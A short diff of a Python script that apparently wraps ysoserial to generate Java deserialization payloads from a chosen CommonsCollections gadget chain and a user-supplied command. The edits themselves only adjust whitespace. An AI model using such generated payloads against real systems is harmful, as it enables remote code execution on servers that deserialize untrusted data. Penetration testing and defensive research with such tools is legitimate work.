@@ -22,7 +22,7 @@ def get_method():
     8. Other Libraries
         \n""","cyan"))
         if int(method_input) in range(1,8):
-            return 'CommonsCollections'+method_input
+            return 'CommonsCollections'+ method_input
         elif int(method_input) == 8:
             method_input = input("Enter the library to use: \n")
             return method_input
@@ -35,7 +35,7 @@ def get_command():
     return ("\'" + command_input + "\'")
 
 def java_payload(get_method,get_command):
-    java_path = java_loc + " -jar " +ysoserial_loc + " " + get_method + " " + get_command
+    java_path = java_loc + " -jar " + ysoserial_loc + " " + get_method + " " + get_command
     print(colored("\nGenerating payload = " + java_path + "\n","cyan"))
     try:
         #Run command in cmd or shell
